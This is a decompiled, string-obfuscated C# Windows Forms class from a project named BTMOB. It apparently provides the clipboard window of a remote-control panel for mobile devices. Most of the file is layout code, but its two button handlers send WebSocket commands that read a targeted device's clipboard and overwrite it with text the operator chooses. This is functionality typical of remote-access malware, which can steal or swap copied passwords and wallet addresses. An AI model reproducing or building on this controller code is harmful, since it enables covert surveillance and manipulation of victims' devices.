using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class Clipboard : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("logclipboard")]
	private RichTextBox _logclipboard;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("setbtn")]
	private DrakeUIButtonIcon _setbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("getbtn")]
	private DrakeUIButtonIcon _getbtn;

	public string mobid;

	public WebSocketClient WSClient;

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual RichTextBox logclipboard
	{
		[CompilerGenerated]
		get
		{
			return _logclipboard;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = logclipboard_TextChanged;
			RichTextBox richTextBox = _logclipboard;
			if (richTextBox != null)
			{
				richTextBox.TextChanged -= value2;
			}
			_logclipboard = value;
			richTextBox = _logclipboard;
			if (richTextBox != null)
			{
				richTextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mictoolbox")]
	internal virtual TableLayoutPanel mictoolbox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pausebtn")]
	internal virtual DrakeUIButtonIcon pausebtn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon setbtn
	{
		[CompilerGenerated]
		get
		{
			return _setbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = setbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _setbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_setbtn = value;
			drakeUIButtonIcon = _setbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon getbtn
	{
		[CompilerGenerated]
		get
		{
			return _getbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = getbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _getbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_getbtn = value;
			drakeUIButtonIcon = _getbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public Clipboard()
	{
		base.Load += Clipboard_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.Clipboard));
		this.Panel3 = new System.Windows.Forms.Panel();
		this.mictoolbox = new System.Windows.Forms.TableLayoutPanel();
		this.setbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.pausebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.getbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.logclipboard = new System.Windows.Forms.RichTextBox();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.mictoolbox.SuspendLayout();
		this.Panel4.SuspendLayout();
		base.SuspendLayout();
		this.myscr.Location = new System.Drawing.Point(63, 5);
		this.myscr.Visible = false;
		this.pinbtn.Location = new System.Drawing.Point(358, 5);
		this.minibtn.Location = new System.Drawing.Point(400, 5);
		this.closbtn.Location = new System.Drawing.Point(442, 5);
		this.myico.Image = BTMOB.My.Resources.Resources.clipico;
		this.myico.Size = new System.Drawing.Size(48, 25);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(474, 18);
		this.mytitle.Text = EXGuarder._12140C31;
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(484, 26);
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.Panel3.Controls.Add(this.mictoolbox);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel3.Location = new System.Drawing.Point(2, 318);
		this.Panel3.Name = EXGuarder._5C410356;
		this.Panel3.Size = new System.Drawing.Size(484, 45);
		this.Panel3.TabIndex = 40;
		this.mictoolbox.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mictoolbox.ColumnCount = 3;
		this.mictoolbox.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.mictoolbox.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.mictoolbox.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.mictoolbox.Controls.Add(this.setbtn, 0, 0);
		this.mictoolbox.Controls.Add(this.pausebtn, 0, 0);
		this.mictoolbox.Controls.Add(this.getbtn, 0, 0);
		this.mictoolbox.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mictoolbox.Location = new System.Drawing.Point(0, 0);
		this.mictoolbox.Name = EXGuarder._0A091C5F;
		this.mictoolbox.Padding = new System.Windows.Forms.Padding(6, 5, 6, 5);
		this.mictoolbox.RowCount = 1;
		this.mictoolbox.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
		this.mictoolbox.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 34f));
		this.mictoolbox.Size = new System.Drawing.Size(484, 45);
		this.mictoolbox.TabIndex = 50;
		this.setbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.setbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.setbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.setbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.setbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.setbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.setbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.setbtn.Font = new System.Drawing.Font(EXGuarder._724E7112, 9f);
		this.setbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.setbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.setbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.setbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.setbtn.Location = new System.Drawing.Point(323, 8);
		this.setbtn.Name = EXGuarder._42106C25;
		this.setbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.setbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.setbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.setbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.setbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.setbtn.Size = new System.Drawing.Size(152, 29);
		this.setbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.setbtn.Symbol = 61508;
		this.setbtn.TabIndex = 49;
		this.setbtn.Text = EXGuarder._2F6D2B28;
		this.pausebtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pausebtn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.pausebtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.Font = new System.Drawing.Font(EXGuarder._724E7112, 9f);
		this.pausebtn.ForeHoverColor = System.Drawing.Color.Gray;
		this.pausebtn.Location = new System.Drawing.Point(166, 8);
		this.pausebtn.Name = EXGuarder._3E1B5A5D;
		this.pausebtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.pausebtn.RectColor = System.Drawing.Color.Gray;
		this.pausebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.pausebtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.pausebtn.Size = new System.Drawing.Size(151, 29);
		this.pausebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.pausebtn.Symbol = 0;
		this.pausebtn.TabIndex = 22;
		this.getbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.getbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.getbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.getbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.getbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.getbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.getbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.getbtn.Font = new System.Drawing.Font(EXGuarder._724E7112, 9f);
		this.getbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.getbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.getbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.getbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.getbtn.Location = new System.Drawing.Point(9, 8);
		this.getbtn.Name = EXGuarder._60176773;
		this.getbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.getbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.getbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.getbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.getbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.getbtn.Size = new System.Drawing.Size(151, 29);
		this.getbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.getbtn.Symbol = 61470;
		this.getbtn.TabIndex = 50;
		this.getbtn.Text = EXGuarder._1A161303;
		this.Panel4.Controls.Add(this.logclipboard);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel4.Location = new System.Drawing.Point(2, 64);
		this.Panel4.Name = EXGuarder._121A2514;
		this.Panel4.Size = new System.Drawing.Size(484, 254);
		this.Panel4.TabIndex = 41;
		this.logclipboard.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.logclipboard.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.logclipboard.Dock = System.Windows.Forms.DockStyle.Fill;
		this.logclipboard.Font = new System.Drawing.Font(EXGuarder._724E7112, 9f);
		this.logclipboard.ForeColor = System.Drawing.SystemColors.Control;
		this.logclipboard.Location = new System.Drawing.Point(0, 0);
		this.logclipboard.Name = EXGuarder._1C351E64;
		this.logclipboard.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
		this.logclipboard.Size = new System.Drawing.Size(484, 254);
		this.logclipboard.TabIndex = 3;
		this.logclipboard.Text = EXGuarder._282E173E;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(488, 365);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.Panel3);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._74607117);
		this.MaximumSize = new System.Drawing.Size(557, 365);
		this.MinimumSize = new System.Drawing.Size(488, 293);
		base.Name = EXGuarder._52264807;
		this.Text = EXGuarder._52264807;
		base.Controls.SetChildIndex(this.Panel3, 0);
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel4, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.mictoolbox.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void logclipboard_TextChanged(object sender, EventArgs e)
	{
		setbtn.Enabled = true;
	}

	private void getbtn_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._79553E72, EXGuarder._7100532D);
		dictionary.Add(EXGuarder._2501336E, EXGuarder._10055665);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, mobid, WSClient);
	}

	private void setbtn_Click(object sender, EventArgs e)
	{
		if (MyMsg.Show(BTConst.confirmstr, BTConst.updateclipstr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._084F4D30) == DialogResult.OK)
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._22121F06, EXGuarder._2E716A2D);
			dictionary.Add(EXGuarder._191F2F16, EXGuarder._2E366E36);
			dictionary.Add(EXGuarder._2A5C4712, logclipboard.Text);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, mobid, WSClient);
		}
	}

	private void Clipboard_Load(object sender, EventArgs e)
	{
		logclipboard.AutoWordSelection = false;
		mytitle.Text = BTConst.clipbstr;
	}
}
